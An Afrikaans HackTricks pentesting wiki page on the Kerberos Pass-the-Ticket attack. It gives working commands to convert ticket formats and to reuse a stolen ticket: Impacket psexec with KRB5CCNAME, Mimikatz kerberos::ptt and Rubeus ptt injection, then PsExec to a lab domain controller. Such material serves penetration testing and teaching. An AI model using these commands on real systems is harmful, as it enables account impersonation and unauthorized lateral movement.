# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

In 'n Pass-the-Ticket (PtT)-aanval gebruik 'n aanvaller 'n gesteelde Kerberos-ticket om as die ticket se principal te authenticateer sonder om daardie rekening se wagwoord te besit. 'n Ticket-granting ticket (TGT) kan gebruik word om service tickets aan te vra, terwyl 'n gesteelde service ticket beperk is tot sy teikendiens en geldigheidstydperk.<sup>[[1]](#references)</sup>

Vir ticket-acquisition-tegnieke, sien:

- [Tickets vanaf Windows harvest](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Tickets vanaf Linux harvest](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Omskakeling van Linux- en Windows-ticketformate

Kerberos-caches verskyn algemeen as MIT `ccache`-lêers op Linux en `.kirbi`-lêers op Windows. `ticket_converter` skakel tussen hierdie formate om deur 'n input-ticket en output-path te gebruik.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo verskaf ook Kerberos ticket tooling op Windows.<sup>[[3]](#references)</sup>

## Gebruik van 'n Ticket

Op Linux, wys `KRB5CCNAME` na die cache en gee 'n Impacket-client opdrag om Kerberos te gebruik sonder om vir 'n wagwoord te vra:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Op Windows kan Mimikatz of Rubeus ’n `.kirbi`-ticket in die huidige aanmeldingsessie invoer. Gebruik `klist` om die resulterende cache te inspekteer.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticket-import verleen nie voorregte buiten dié wat deur die ticket en die teiken diens se magtigingsbeleid verteenwoordig word nie. Verstreke, herroepe, verkeerd gevormde of tickets met ’n verkeerde omvang kan misluk.<sup>[[1]](#references)</sup>

Vir breër Kerberos-aanvalskonteks en verwante ticket-verkrygingstegnieke, sien Tarlogic se Kerberos-aanvalsgids.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket-voorbeelde](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos-aanvalstegnieke](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
